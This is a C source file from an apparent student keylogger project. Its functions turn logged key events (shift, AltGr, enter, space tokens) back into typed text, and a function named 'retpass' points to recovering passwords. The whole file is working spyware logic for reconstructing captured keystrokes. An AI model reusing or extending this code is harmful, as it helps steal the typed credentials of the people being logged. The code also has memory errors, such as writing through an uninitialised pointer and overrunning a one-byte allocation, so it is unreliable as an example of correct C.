/*
** convert_pass.c for keylogger in /home/azword/delivery/Perso/PSU/Keylogger/src
** 
** Made by Nathan Tréhout | Az'
** Login   <miguel.joubert@epitech.eu>
** 
** Started on  Sat Dec 31 15:06:40 2016 Nathan Trehout
** Last update Sat Dec 31 15:07:00 2016 Nathan Trehout
*/

#include "my.h"

char    **put_space(char **dest)
{
  int   i;
  int   j;

  i = 0;
  (strcmp(dest[0], "ENTREE") == 0) ? i++ : 0;
  while (dest[i] != 0)
    {
      if (strcmp(dest[i], "ALTGR") != 0 && strcmp(dest[i], "RSHIFT") != 0
	  && strcmp(dest[i], "LSHIFT") != 0 && strcmp(dest[i], " ") != 0)
	{
	  j = i + 1;
	  while (strcmp(dest[i], dest[j]) != 0)
	    j++;
	  dest[j] = " ", i++, j = i + 1;
	}
      else
	i++;
    }
  dest[i] = 0;
  return (dest);
}

char    **put_properly(char **dest)
{
  int   i;

  i = 1;
  while (dest[i + 1] != 0)
    {
      if (strcmp(dest[i], " ") == 0 && strcmp(dest[i + 1], " ") == 0)
	{
	  while (dest[i + 2] != 0)
	    {
	      dest[i + 1] = dest[i + 2];
	      i++;
	    }
	  dest[i + 1] = 0;
	  i = 1;
	}
      else
	i++;
    }
  return (dest);
}

char    **multiple_insert(char **dest)
{
  int   i;
  int   j;
  char  **str;

  str = malloc(sizeof(char *) * strlencharchar(dest));
  i = 1;
  *str = "ENTREE";
  while (dest[i] != 0)
    {
      if (strcmp(dest[i],"RSHIFT") == 0 || strcmp(dest[i], "LSHIFT") == 0)
	{
	  str[i] = strdup(dest[i]), j = i + 1;
	  while (strcmp(dest[j], dest[i]) != 0)
	    {
	      if (strlen(dest[j]) <= 2 && strcmp(dest[j], " ") != 0)
		{
		  str[j] = malloc(sizeof(char));
		  (*dest[j] >= 97 && *dest[j] <= 122) ?
		    *str[j] = retmaj(*dest[j]), str[j][1] = '\0' : 0;
		  (*dest[j] < 97 || *dest[j] > 122) ?
		    str[j] = retmaj_bis(dest[j]) : 0;
		}
	      else
		str[j] = strdup(dest[j]);
	      j++;
	    }
	  str[j] = strdup(dest[j]), i = j + 1;
	}
      else if (strcmp(dest[i],"ALTGR") == 0)
	{
	  str[i] = strdup(dest[i]), j = i + 1;
	  while (strcmp(dest[j], dest[i]) != 0)
	    {
	      if (strlen(dest[j]) <= 2 && strcmp(dest[j], " ") != 0)
		str[j] = malloc(sizeof(char)), str[j] = retaltgr(dest[j]);
	      else
		str[j] = strdup(dest[j]);
	      j++;
	    }
	  str[j] = strdup(dest[j]), i = j + 1;
	}
      else
	str[i] = strdup(dest[i]), i++;
    }
  str[i] = 0;
  free(dest);
  return (str);
}

char    *retpass(char **dest)
{
  int   i;
  int   j;
  char  *d;

  i = j = 0;
  while (dest[i] != 0)
    {
      if (strcmp(dest[i], " ") == 0 || strcmp(dest[i], "RSHIFT") == 0
	  || strcmp(dest[i], "LSHIFT") == 0 || strcmp(dest[i], "ALTGR") == 0)
	i++;
      else if (strcmp(dest[i], "ENTREE") == 0)
	d[j++] = '\n', i++;
      else if (strcmp(dest[i], "SPACE") == 0)
	d[j++] = ' ', i++;
      else
	d = strcat(d, dest[i]), j += strlen(dest[i]), i++;
    }
  d[j] = 0;
  free(dest);

  return (d);
}
